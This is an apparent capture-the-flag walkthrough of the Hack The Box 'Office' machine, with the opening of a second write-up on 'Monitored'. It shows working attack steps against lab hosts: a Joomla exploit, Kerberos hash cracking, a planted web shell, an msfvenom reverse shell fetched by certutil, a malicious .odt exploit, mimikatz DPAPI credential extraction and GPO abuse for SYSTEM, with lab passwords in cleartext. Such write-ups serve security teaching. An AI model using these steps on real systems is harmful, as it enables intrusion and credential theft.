.nolineno}I checked the Joomla site version from this path â¬`http://office.htb/administrator/manifests/files/joomla.xml`![Image](Pasted%20image%2020240421231053.png)_Joomla version is 4.2.7_I recon online and found that this version is vulnerable to this exploit â¬[Joomla! v4.2.8 - Unauthenticated information disclosure](https://www.exploit-db.com/exploits/51334)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ ruby exploit1.rb http://office.htbUsers[474] Tony Stark (Administrator) - Administrator@holography.htb - Super UsersSite infoSite name: Holography IndustriesEditor: tinymceCaptcha: 0Access: 1Debug status: falseDatabase infoDB type: mysqliDB host: localhostDB user: rootDB password: H0lOgrams4reTakIng0Ver754!DB name: joomla_dbDB prefix: if2tx_DB encryption 0```{: .nolineno}I got a password but the username is no match that I found through kerbrute scan so lets take a look into other users with same passwords.And I found one dwolfe user that matches with this password .![Image](Pasted%20image%2020240421231653.png)_netexec Tool for SMB service bruteforce username_![Image](Pasted%20image%2020240419152801.png)_netexec Tool can for checking SMB access_Lets Look into `SOC Analysis` Share â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ smbclient //10.10.11.3/'SOC Analysis' -U dwolfePassword for [WORKGROUP\\dwolfe]:Try \"help\" to get a list of possible commands.smb: \\> dir . D 0 Thu May 11 00:22:24 2023 .. DHS 0 Wed Feb 14 15:48:31 2024 Latest-System-Dump-8fbc124d.pcap A 1372860 Mon May 8 06:29:00 2023\t\t6265599 blocks of size 4096. 646691 blocks availablesmb: \\> ```{: .nolineno}I got a `pcap` file from this Share lets look into some different kinds of protocols .I found kerberos protocol in packets â¬![Image](Pasted%20image%2020240420093308.png)_kerberos protocol_Now to decrypt its data I used this site's help to decrypt this kerberos ticket â¬- https://wiki.wireshark.org/Kerberos- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting#traffic```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ ktutilktutil: addent -password -p office.htb/dwolfe -k 18 -e AES256-CTS-HMAC-SHA1-96Password for office.htb/dwolfe@ATHENA.MIT.EDU: ktutil: wkt ./keytab3.filektutil: q```{: .nolineno}I made a keytab file that will decrypt this packet with this username and password .Lets include it in wireshark and see the data â¬![Image](Pasted%20image%2020240420093806.png)_Path to include the keytab file in wireshark_![Image](Pasted%20image%2020240420093928.png)_Yellow highlighted data seams decoded_I can see the cipher part along with the e-type which is (18) so lets make it in that format by including this formats like this â¬```krbtgt$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc```{: .nolineno}I then used a Cracking tool called hashcat and it did the work for me and decoded the password like this â¬![Image](Pasted%20image%2020240420094259.png)I got the password of user tstark so lets see if I can get any other tickets through its credentials â¬But no good , nothing I was stuck here for some time then I though of signing in into the joomla site with this creds , still no luck But ðŸ˜•When I changed the username as Administrator and used the password of tstark I was in â¬![Image](Pasted%20image%2020240420101422.png)_Joomla Dashboard_For reverse shell follow this path â© System > Site Templates > ![Image](Pasted%20image%2020240420101659.png)_Web shell added on error.php page_Lets load our webshell site â¬`http://office.htb/templates/cassiopeia/error.php`![Image](Pasted%20image%2020240420101958.png)_Web Shell is working_Now its time to get the reverse shell so for that I uploaded the nc.exe file and I have the shell now â¬![Image](Pasted%20image%2020240420102529.png)_nc.exe leads me to reverse shell_![Image](Pasted%20image%2020240420102509.png)_Reverse Shell_I then uploaded the [RunasCs.exe](https://github.com/antonioCoco/RunasCs) file that lets me run as some other user with their credentials â¬![Image](Pasted%20image%2020240420103408.png)_Shell as tstark user_```powershellC:\\Users>cd tstark cd tstark C:\\Users\\tstark>tree /f /atree /f /aFolder PATH listingVolume serial number is C626-9388C:.+---Desktop| user.txt| +---Documents+---Downloads +---Favorites+---Links+---Music+---OneDrive+---Pictures+---Saved Games\\---VideosC:\\Users\\tstark>```{: .nolineno}I checked the network ports for internal running services check and I found this â¬![Image](Pasted%20image%2020240420122043.png)_port 8083 looks suspicious_I have to check it but for that I need to perform port forwarding and for this case I will be using chisel.exe Tool.On Attacker Machine start the server on port 8888 â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[/opt/Tools]â””â”€$ /opt/Tools/chisel server --port 8888 --reverse2024/04/20 12:58:11 server: Reverse tunnelling enabled2024/04/20 12:58:11 server: Fingerprint N+tr8/LmA3vajiTHmbqjif7CVhP+2914/iJ6s+Rd/Rw=2024/04/20 12:58:11 server: Listening on http://0.0.0.0:88882024/04/20 12:58:15 server: session#1: Client version (1.9.1) differs from server version (1.7.7)2024/04/20 12:58:15 server: session#1: tun: proxy#R:8083=>10.10.11.3:8083: Listening```{: .nolineno}On Victim Machine run the client command to connect from â¬```powershellC:\\Users\\tstark\\Downloads>chisel.exe client 10.10.16.17:8888 R:8083:10.10.11.3:8083chisel.exe client 10.10.16.17:8888 R:8083:10.10.11.3:80832024/04/20 08:27:41 client: Connecting to ws://10.10.16.17:88882024/04/20 08:28:09 client: Retrying in 3.2s...2024/04/20 08:28:16 client: Connected (Latency 328.3879ms)```{: .nolineno}Lets check it also through nmap port scan ðŸ”»```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ sudo nmap -p 8083 127.0.0.1Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 12:58 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.000057s latency).PORT STATE SERVICE8083/tcp open us-srvNmap done: 1 IP address (1 host up) scanned in 0.16 seconds```{: .nolineno}I get this static site â¬![Image](Pasted%20image%2020240420125947.png)_Front page_Now I was stuck again for a while then while recon I got a CVE exploit related to `.odt` extension since the mime type is exploitable as I can see from resume.php source code So lets see â¬#### CVE-2023-2255And related exploit I used this one https://github.com/elweth-sec/CVE-2023-2255/tree/main .>But before using it my methodology here is to execute a reverse shell which is located in this location `C:\\ProgramData\\Shell.exe` , when uploading the exploit.odt file.{: .prompt-info }My Reverse Shell looks like this â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 324 bytesFinal size of exe file: 73802 bytesSaved as: shell.exe```{: .nolineno}Lets upload this exploit in that location `C:\\ProgramData\\Shell.exe`.```powershellC:\\ProgramData>certutil -f -urlcache http://10.10.16.17/shell.exe Shell.execertutil -f -urlcache http://10.10.16.17/shell.exe Shell.exe**** Online ****CertUtil: -URLCache command completed successfully.C:\\ProgramData>dirdir Volume in drive C has no label. Volume Serial Number is C626-9388 Directory of C:\\ProgramData02/14/2024 03:17 AM Package Cache01/17/2024 11:07 AM Packages01/30/2024 09:43 AM regid.1991-06.com.microsoft04/21/2024 09:26 AM 73,802 Shell.exe05/08/2021 01:20 AM SoftwareDistribution05/08/2021 02:36 AM ssh04/12/2023 06:35 PM USOPrivate05/08/2021 01:20 AM USOShared01/22/2024 11:04 AM VMware 1 File(s) 73,802 bytes 8 Dir(s) 4,900,913,152 bytes freeC:\\ProgramData>```{: .nolineno}Lets create `.odt` exploit now â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office/CVE-2023-2255]â””â”€$ python3 CVE-2023-2255.py --cmd 'C:\\ProgramData\\Shell.exe' --output exploit.odtFile exploit.odt has been created !```{: .nolineno}Now through port forwarded hosted site lets upload this exploit â¬![Image](Pasted%20image%2020240421140735.png)_Uploading this exploit.odt payload into the system_![Image](Pasted%20image%2020240421140656.png)_Uploaded successful !_After a while in few seconds I received netcat connection on port 9001 â¬![Image](Pasted%20image%2020240421140937.png)_Reverse Shell as user ppotts_I am moving laterally , good ðŸ˜ƒLet take a look into cached credentials ðŸ”½## What is DPAPIThe Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.### Protected Data by [DPAPI](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords#what-is-dpapi)Among the personal data protected by DPAPI are:- Internet Explorer and Google Chrome's passwords and auto-completion data - E-mail and internal FTP account passwords for applications like Outlook and Windows Mail - Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys - Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes - Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and moreIn this senario I need 2,3 things to crack the password : - Mimikatz- Creds : `C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials`- guidMasterkeys : `%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Protect\\{SID}\\guidMasterKey`- key: (example) `c032ed0377e4c6a07b0de1fcca036f61134d89085dbe075e1e878b67a86ed748541e913cc3242024a63e21ea20e0a6ceb38426cb9d73e4178821413fbbba79e8`##### Let Collect all these things along the way â¬Location â© `C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials````powershellC:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials>dir /a /o /Qdir /a /o /Q Volume in drive C has no label. Volume Serial Number is C626-9388 Directory of C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials05/09/2023 04:14 PM OFFICE\\ppotts .01/18/2024 10:34 AM OFFICE\\ppotts ..05/09/2023 02:08 PM 358 OFFICE\\ppotts 18A1927A997A794B65E9849883AC3F3E05/09/2023 04:03 PM 398 OFFICE\\ppotts 84F1CAEEBF466550F4967858F9353FB401/18/2024 12:53 PM 374 OFFICE\\ppotts E76CCA3670CD9BB98DF79E0A8D176F1E 3 File(s) 1,130 bytes 2 Dir(s) 4,872,421,376 bytes freeC:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials>```{: .nolineno}Lets open Mimikatz and run the commands â¬```mimikatz .#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz # dpapi::cred /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\credentials\\XXXXXXXXXXX```{: .nolineno}ðŸ”½```mimiktazmimikatz # dpapi::cred /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials\\18A1927A997A794B65E9849883AC3F3E**BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 0000003a - 58 szDescription : Enterprise Credential Data algCrypt : 00006603 - 26115 (CALG_3DES) dwAlgCryptLen : 000000c0 - 192 dwSaltLen : 00000010 - 16 pbSalt : 88fdf043461d4913a49680c2cf45e8e6 dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 00008004 - 32772 (CALG_SHA1) dwAlgHashLen : 000000a0 - 160 dwHmac2KeyLen : 00000010 - 16 pbHmack2Key : b68952824efb5374f396ef024b7f4f56 dwDataLen : 00000098 - 152 pbData : 0c1483543655e1eee285cb5244a83b72932723e88f937112d54896b19569be22aeda49f9aec91131dab8edae525506e7aa4861c98d67768350051ae93d9c493596d3e506fae0b6e885acd9d2a2837095d7da3f60d80288f4f8b8800171f26639df136e45eb399341ab216c81cf753aecc5342b6b212d85a46be1e2b45f6fcebd140755ec9d328c6d66a7bab635346de54fee236a63d20507 dwSignLen : 00000014 - 20 pbSign : 3a5e83bb958d713bfae523404a4de188a0319830mimikatz #```{: .nolineno}- From above output we can extract the guidMasterKey from here â¬\t`guidMasterKey : 191d3f9d-7959-4b4d-a520-a444853c47eb`1. Lets find the SID and its inside guidMasterKey content ,The general found location is this â© ```powershell# Legacy CMD Envrionment Variables\"%USERPROFILE%\\AppData\\Local\\Microsoft\\Protect\"\"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Protect\"# PowerShell Environment Variables\"$env:USERPROFILE\\AppData\\Local\\Microsoft\\Protect\"\"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Protect\"```{: .nolineno}`ls -r -h ~\\AppData\\Roaming\\Microsoft\\Protect\\ | select -expand fullname`OR```powershellls -force C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Protect\\{SID}\\```{: .nolineno}ðŸ”½```powershellPS C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials> ls -force C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1199398058-4196589450-691661856-1107ls -force C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1199398058-4196589450-691661856-1107 Directory: C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1199398058-4196589450-691661856-1107Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs- 1/17/2024 3:43 PM 740 10811601-0fa9-43c2-97e5-9bef8471fc7d -a-hs- 5/2/2023 4:13 PM 740 191d3f9d-7959-4b4d-a520-a444853c47eb -a-hs- 4/20/2024 11:44 AM 740 3ef935fa-b90d-484c-b0af-6a340e9534d7 -a-hs- 5/2/2023 4:13 PM 900 BK-OFFICE -a-hs- 4/20/2024 11:44 AM 24 Preferred```{: .nolineno}2. Now lets include the master key â¬\t- /rpc : it can be used to remotely decrypt the masterkey of the target user by contacting the domain controller`.` According to Benjamin, in a domain, a domain controller runs an RPC Service to deal with encrypted masterkeys for users, [MS-BKRP](https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-BKRP/[MS-BKRP].pdf) (Backupkey Remote Protocol).\t```mimikatzmimikatz # dpapi::masterkey /in:C:\\Users\\PPotts\\appdata\\roaming\\microsoft\\protect\\{SID}\\{guidMasterKey} /rpc```{: .nolineno}ðŸ”½```mimikatzmimikatz # dpapi::masterkey /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1199398058-4196589450-691661856-1107\\10811601-0fa9-43c2-97e5-9bef8471fc7d /rpc**MASTERKEYS** dwVersion : 00000002 - 2 szGuid : {10811601-0fa9-43c2-97e5-9bef8471fc7d} dwFlags : 00000000 - 0 dwMasterKeyLen : 00000088 - 136 dwBackupKeyLen : 00000068 - 104 dwCredHistLen : 00000000 - 0 dwDomainKeyLen : 00000174 - 372[masterkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 8bc9f4a7b9094394e57e92daedeafcb9 rounds : 00004650 - 18000 algHash : 00008009 - 32777 (CALG_HMAC) algCrypt : 00006603 - 26115 (CALG_3DES) pbKey : f97146093504382ec842cd2eec5f2bbfbbdd83ab6c4e44ada82d5ae23d1a05422fe6d1378165d4434bf41737616acf823e86c69424271d0f72684018a0928045ef77b719003b352644398f4286795b1297bee821deec898cb167aa76d984808014aa0d22136688c3[backupkey] **MASTERKEY** dwVersion : 00000002 - 2 salt : 26773bc8263172355939bdb9cb33e2f9 rounds : 00004650 - 18000 algHash : 00008009 - 32777 (CALG_HMAC) algCrypt : 00006603 - 26115 (CALG_3DES) pbKey : 540c745f74ac62c43d245e850eb9952d6daf6a803163b94683eb82a30bf3d20d8e72d4e1003e0f17ca2575722c009e1855333ddacb7f08702369b0035aff50163eee5d2f2384fe28[domainkey] **DOMAINKEY** dwVersion : 00000002 - 2 dwSecretLen : 00000100 - 256 dwAccesscheckLen : 00000058 - 88 guidMasterKey : {e523832a-e126-4d6e-ac04-ed10da72b32f} pbSecret : dda74feddaea0b4119723acb88bb3aa033b85d6fd6451d04d0afa95d00c640d33d83f0894c5c62fd6298327c40773512ccad8961131005b450732f72bc3ece29defa2088def5dce8f64ff76641057d473ad0073688c39c491286461b57a38eddbde92f213811ba2ec0f7867cd377df0b860584e3fc082529e7adaa437ebb3ac8c39a567df96bf21ce21bfb7c687b613b678a8be14f1fc6e96c9a16a18c156bc0255e514cfd61eb4d81fa08060c6cd35d330f5a0121ca7126ba667ccb1fbb2f93857f8230e20606b7b69d558b9462012db6e6418acd86d1b9a671d94ff92e5fd3684b099f5a29165a3410ddb9e924b4b31f22428895f37815badf7ec30fe80884 pbAccesscheck : a98be73386a3dca744e20b13b967e3bc4a1f58bf9be981bf84cf2e2c4daab8ca4def27d6e22540e7eebadd6c122ed75a1b991532d88794e2e999673385241275fe2735bbbb46f9e88dbd799589b42d572ca6b14ecf279a6dAuto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107[backupkey] without DPAPI_SYSTEM: key : 2c19b1b2f1784e79edaed52a319cc5b4ad42179d4906fd084aef8e6e6dd9b8db sha1: 4961d54be229fd871debd903b3d518ea4d362c42[domainkey] with RPC[DC] 'office.htb' will be the domain[DC] 'DC.office.htb' will be the DC server key : 3f891c81971ccacb02123a9dde170eaae918026ccc0a305b221d3582de4add84c900ae79f950132e4a70b0ef49dea6907b4f319c5dd10f60cc31cb1e3bc33024 sha1: fbab11cacdd8407e8db9604f0f8c92178bee6fd3```{: .nolineno}3. Last Step to decode the key with guidMasterKey and with Creds{HASH} â¬```mimikatzmimikatz # dpapi::cred /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials\\XXXXXXXXXXXXXXXXXX /guidMasterkey::(key_value_that_looks_like_this)87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166```{: .nolineno}ðŸ”½```mimikatzmimikatz # dpapi::cred /in:C:\\Users\\PPotts\\AppData\\Roaming\\Microsoft\\Credentials\\84F1CAEEBF466550F4967858F9353FB4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166**BLOB** dwVersion : 00000001 - 1 guidProvider : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb} dwMasterKeyVersion : 00000001 - 1 guidMasterKey : {191d3f9d-7959-4b4d-a520-a444853c47eb} dwFlags : 20000000 - 536870912 (system ; ) dwDescriptionLen : 0000003a - 58 szDescription : Enterprise Credential Data algCrypt : 00006603 - 26115 (CALG_3DES) dwAlgCryptLen : 000000c0 - 192 dwSaltLen : 00000010 - 16 pbSalt : 649c4466d5d647dd2c595f4e43fb7e1d dwHmacKeyLen : 00000000 - 0 pbHmackKey : algHash : 00008004 - 32772 (CALG_SHA1) dwAlgHashLen : 000000a0 - 160 dwHmac2KeyLen : 00000010 - 16 pbHmack2Key : 32e88dfd1927fdef0ede5abf2c024e3a dwDataLen : 000000c0 - 192 pbData : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97 dwSignLen : 00000014 - 20 pbSign : 21bfb22ca38e0a802e38065458cecef00b450976Decrypting Credential: * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77;Key:available**CREDENTIAL** credFlags : 00000030 - 48 credSize : 000000be - 190 credUnk0 : 00000000 - 0 Type : 00000002 - 2 - domain_password Flags : 00000000 - 0 LastWritten : 5/9/2023 11:03:21 PM unkFlagsOrSize : 00000018 - 24 Persist : 00000003 - 3 - enterprise AttributeCount : 00000000 - 0 unk0 : 00000000 - 0 unk1 : 00000000 - 0 TargetName : Domain:interactive=OFFICE\\HHogan UnkData : (null) Comment : (null) TargetAlias : (null) UserName : OFFICE\\HHogan CredentialBlob : H4ppyFtW183# Attributes : 0mimikatz # ```{: .nolineno}I have the credentials now !!```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ nxc winrm 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'SMB 10.10.11.3 445 DC [*] Windows 10.0 Build 20348 (name:DC) (domain:office.htb)WINRM 10.10.11.3 5985 DC [+] office.htb\\hhogan:H4ppyFtW183# (Pwn3d!)```{: .nolineno}Since it has winrm access ,So lets have winrm session .### Winrm Session â¤µï¸```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\HHogan\\Documents> whoamioffice\\hhoganwhoami *Evil-WinRM* PS C:\\Users\\HHogan\\Documents> whoami /allUSER INFORMATION----------------User Name SID============= ======================================office\\hhogan S-1-5-21-1199398058-4196589450-691661856-1108GROUP INFORMATION-----------------Group Name Type SID Attributes=========================================== ================ ============================================= ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupOFFICE\\GPO Managers Group S-1-5-21-1199398058-4196589450-691661856-1117 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.```{: .nolineno}From Bloodhound I can see that this user has GenericWrite on 2 GPOs here â¬![Image](Pasted%20image%2020240421225033.png)For Abusing that I used this [SharpGPOAbuse.exe](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master) Tool that will enable me to execute some commands â¬```powershell*Evil-WinRM* PS C:\\Users\\HHogan\\Documents> curl http://10.10.16.17/SharpGPOAbuse.exe -o SharpGPOAbuse.exe*Evil-WinRM* PS C:\\Users\\HHogan\\Documents>```{: .nolineno}Let's Add a Computer task that will execute my previous uploaded reverse shell immediately ðŸ”½ ```powershell*Evil-WinRM* PS C:\\Users\\HHogan\\Documents> .\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Install Updates\" --Author NT AUTHORITY\\SYSTEM --Command \"cmd.exe\" --Arguments \"/c C:\\ProgramData\\Shell.exe\" --GPOName \"DEFAULT DOMAIN CONTROLLERS POLICY\"[+] Domain = office.htb[+] Domain Controller = DC.office.htb[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb[+] GUID of \"DEFAULT DOMAIN CONTROLLERS POLICY\" is: {6AC1786C-016F-11D2-945F-00C04fB984F9}[+] Creating file \\\\office.htb\\SysVol\\office.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml[+] versionNumber attribute changed successfully[+] The version number in GPT.ini was increased successfully.[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.[+] Done!```{: .nolineno}As a result after a while I got the reverse shell â¬```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ rlwrap nc -lvnp 9001listening on [any] 9001 ...connect to [10.10.16.17] from (UNKNOWN) [10.10.11.3] 53923whoamiMicrosoft Windows [Version 10.0.20348.2322](c) Microsoft Corporation. All rights reserved.C:\\Windows\\system32>C:\\Windows\\system32>whoamint authority\\systemC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is C626-9388C:.+---.ssh| known_hosts| +---3D Objects+---Contacts+---Desktop| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music| cleanup_gpo_abuse.ps1| joomla.zip| +---OneDrive+---Pictures+---Saved Games+---Searches| winrt--{S-1-5-21-1199398058-4196589450-691661856-500}-.searchconnector-ms| \\---VideosC:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Monitored", "url": "/posts/Monitored/", "categories": "HackTheBox", "tags": "api, Nagios, PrivEsc, UDP, SNMP, SQLi, sqlmap, CMS", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://app.hackthebox.com/machines/Monitored](https://app.hackthebox.com/machines/Monitored) || ------------------ | -------------------------------------...", "content": "| Machine Link | [https://app.hackthebox.com/machines/Monitored](https://app.hackthebox.com/machines/Monitored) || ------------------ | ---------------------------------------------------------------------------------------------------------------- || Operating System | Linux || Difficulty | Medium || Machine Created by | [TheCyberGeekÂ &](https://app.hackthebox.com/users/114053)Â & [ruycr4ft](https://app.hackthebox.com/users/1253217) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Monitored]â””â”€$ nmap -sC -sV -T4 -oN Nmap_Results.txt 10.10.11.248Warning: 10.10.11.248 giving up on port because retransmission cap hit (6).Nmap scan report for 10.10.11.248Host is up (0.17s latency).Not shown: 987 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)| ssh-hostkey: | 3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)| 256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)|_ 256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)80/tcp open http Apache httpd 2.4.56|_http-server-header: Apache/2.4.56 (Debian)|_http-title: Did not follow redirect to https://nagios.monitored.htb/389/tcp open ldap OpenLDAP 2.2.X - 2.3.X443/tcp open ssl/http Apache httpd 2.4.56 ((Debian))| tls-alpn: |_ http/1.1|_http-server-header: Apache/2.4.56 (Debian)| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK| Not valid before: 2023-11-11T21:46:55|_Not valid after: 2297-08-25T21:46:55|_http-title: Nagios XI|_ssl-date: TLS randomness does not represent time683/tcp filtered corba-iiop1060/tcp filtered polestar1187/tcp filtered alias1984/tcp filtered bigbrother2006/tcp filtered invokator2492/tcp filtered groove3030/tcp filtered arepa-cas6669/tcp filtered irc10001/tcp filtered scp-configService Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸I checked port 80 and found this CMS site along with I redirected to this subdomain name : nagios.monitored.htb .![Image](Pasted%20image%2020240419112713.png)_Nagios_XI dashboard static page_In further enumeration I also did some digging into the UDP port and here are the results â¬## SNMP Enumeration â¤µï¸While doing UDP scan from Nmap I found SNMP port open along with different ports like these â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Monitored]â””â”€$ sudo nmap -sU -T4 10.10.11.248 -vvNmap scan report for nagios.monitored.htb (10.10.11.248)Host is up, received echo-reply ttl 63 (0.49s latency).Scanned at 2024-04-17 12:11:00 IST for 1229sNot shown: 994 closed udp ports (port-unreach)PORT STATE SERVICE REASON68/udp open|filtered dhcpc no-response123/udp open ntp udp-response ttl 63161/udp open snmp udp-response ttl 63162/udp open|filtered snmptrap no-response17592/udp open|filtered unknown no-response58640/udp open|filtered unknown no-response```{: .nolineno}For Enumeration I used snmpbulkwalk Tool as I can also use snmpwalk Tool but for fast output I preferred this tool â¬```bashsudo snmpbulkwalk -v2c -c public -Cn0 -Cr10 10.10.11.248 >> snmpbulkwalk_output.txt```{: .nolineno}![Image](Pasted%20image%2020240417131436.png)I got the credentials for user svc so lets text it on nagios_XI site .while entering the creds I got this error which require token so lets see â¬![Image](Pasted%20image%2020240417145014.png)_Authentication failed due to token expiration_So I had to dig deeper into the api section in order to get the token so I did some directory or files bruteforcing and found these 